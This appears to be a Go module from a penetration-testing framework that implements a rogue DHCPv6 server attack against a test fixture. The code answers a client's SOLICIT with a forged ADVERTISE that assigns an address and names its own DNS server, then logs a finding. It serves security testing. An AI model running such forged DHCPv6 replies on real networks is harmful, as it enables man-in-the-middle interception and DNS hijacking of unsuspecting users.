// roguedhcp6.go implements the rogue DHCPv6 server attack behavior.
//
// Durability (from the catalog): transient-decay. The attack completes
// a solicit→advertise cycle against the fixture and emits a lease
// finding with its decay note (~300s lifetime). No explicit teardown.
//
// The behavior observes a SOLICIT on the attack leg and responds with
// an ADVERTISE from the rogue server.

package ip6

import (
	"context"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"net"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/edge/netpen/runner"
)

type rogueDHCPv6Finding struct {
	Action        string `json:"action"`
	TransactionID string `json:"transaction_id"`
	LeaseAddress  string `json:"lease_address"`
	PreferredLife uint32 `json:"preferred_lifetime"`
	ValidLife     uint32 `json:"valid_lifetime"`
	DecayNote     string `json:"decay_note"`
}

// RunRogueDHCPv6 completes a solicit→advertise cycle against the
// fixture and emits the lease finding with its decay note. The behavior
// observes a SOLICIT on the attack leg's RX and responds with an
// ADVERTISE from the rogue server.
func RunRogueDHCPv6(ctx context.Context, deps runner.Deps) error {
	src := srcMAC()

	// Receive a SOLICIT from the fixture (pushed by the test harness).
	ch := deps.AttackLeg.Receive(ctx)
	var solicit *layers.DHCPv6
	select {
	case frame, ok := <-ch:
		if !ok {
			return fmt.Errorf("roguedhcp6: no solicit received")
		}
		var err error
		solicit, err = decodeDHCPv6(frame.Data)
		if err != nil {
			return fmt.Errorf("roguedhcp6: decode solicit: %w", err)
		}
	case <-ctx.Done():
		return ctx.Err()
	}

	if solicit.MsgType != layers.DHCPv6MsgTypeSolicit {
		return fmt.Errorf("roguedhcp6: expected SOLICIT, got %s", solicit.MsgType)
	}

	// Extract the client DUID from the SOLICIT options.
	var clientDUID []byte
	for _, opt := range solicit.Options {
		if opt.Code == layers.DHCPv6OptClientID {
			clientDUID = opt.Data
			break
		}
	}
	if clientDUID == nil {
		return fmt.Errorf("roguedhcp6: solicit missing ClientID")
	}

	// Craft and send the ADVERTISE response.
	advertise, err := craftDHCPv6Advertise(src, solicit.TransactionID, clientDUID)
	if err != nil {
		return fmt.Errorf("roguedhcp6: craft advertise: %w", err)
	}
	if err := deps.AttackLeg.Send(ctx, advertise); err != nil {
		return fmt.Errorf("roguedhcp6: send advertise: %w", err)
	}

	leaseAddr := net.ParseIP("fd00::200")
	detail, _ := json.Marshal(rogueDHCPv6Finding{
		Action:        "rogue-dhcpv6-server",
		TransactionID: fmt.Sprintf("%x", solicit.TransactionID),
		LeaseAddress:  leaseAddr.String(),
		PreferredLife: 300,
		ValidLife:     600,
		DecayNote:     "~300s lifetime announced",
	})
	deps.Emitter.Finding("dhcpv6", detail)

	return nil
}

// craftDHCPv6Advertise builds a DHCPv6 ADVERTISE from the rogue server.
func craftDHCPv6Advertise(src net.HardwareAddr, xid []byte, clientDUID []byte) ([]byte, error) {
	eth := &layers.Ethernet{
		DstMAC:       dhcpClientMAC,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeIPv6,
	}
	ip := &layers.IPv6{
		Version:    6,
		NextHeader: layers.IPProtocolUDP,
		HopLimit:   255,
		SrcIP:      serverIP6,
		DstIP:      clientIP6,
	}
	udp := &layers.UDP{
		SrcPort: 547,
		DstPort: 546,
	}
	_ = udp.SetNetworkLayerForChecksum(ip)

	// Server DUID (LL type): type=1(LL), hwtype=1(eth), MAC.
	serverDUID := append([]byte{0x00, 0x01, 0x00, 0x01}, src...)

	// IA_NA with IAAddr: IAID(4)+T1(4)+T2(4) + IAAddr option(4+16+4+4)
	iaNAWithAddr := make([]byte, 12+4+16+4+4)
	binary.BigEndian.PutUint32(iaNAWithAddr[0:4], 0x00000001) // IAID
	binary.BigEndian.PutUint32(iaNAWithAddr[4:8], 300)        // T1
	binary.BigEndian.PutUint32(iaNAWithAddr[8:12], 600)       // T2
	// IAAddr option embedded: code(2)+len(2)+addr(16)+pref(4)+valid(4)
	binary.BigEndian.PutUint16(iaNAWithAddr[12:14], uint16(layers.DHCPv6OptIAAddr))
	binary.BigEndian.PutUint16(iaNAWithAddr[14:16], 24) // option data length
	copy(iaNAWithAddr[16:32], net.ParseIP("fd00::200").To16())
	binary.BigEndian.PutUint32(iaNAWithAddr[32:36], 300) // preferred
	binary.BigEndian.PutUint32(iaNAWithAddr[36:40], 600) // valid

	statusData := []byte{0x00, 0x00} // Success

	dhcp := &layers.DHCPv6{
		MsgType:       layers.DHCPv6MsgTypeAdvertise,
		TransactionID: xid,
		Options: layers.DHCPv6Options{
			layers.NewDHCPv6Option(layers.DHCPv6OptServerID, serverDUID),
			layers.NewDHCPv6Option(layers.DHCPv6OptClientID, clientDUID),
			layers.NewDHCPv6Option(layers.DHCPv6OptIANA, iaNAWithAddr),
			layers.NewDHCPv6Option(layers.DHCPv6OptStatusCode, statusData),
			layers.NewDHCPv6Option(layers.DHCPv6OptDNSServers, net.ParseIP("fd00::1").To16()),
		},
	}
	return craftDefault(eth, ip, udp, dhcp)
}

// decodeDHCPv6 decodes a DHCPv6 layer from a raw Ethernet frame
// (Ethernet → IPv6 → UDP → DHCPv6).
func decodeDHCPv6(data []byte) (*layers.DHCPv6, error) {
	pkt := gopacket.NewPacket(data, layers.LayerTypeEthernet, gopacket.Default)
	dhcpLayer := pkt.Layer(layers.LayerTypeDHCPv6)
	if dhcpLayer == nil {
		return nil, fmt.Errorf("no DHCPv6 layer")
	}
	dhcp, ok := dhcpLayer.(*layers.DHCPv6)
	if !ok {
		return nil, fmt.Errorf("unexpected DHCPv6 layer type")
	}
	return dhcp, nil
}

var _ gopacket.SerializableLayer = (*layers.DHCPv6)(nil)
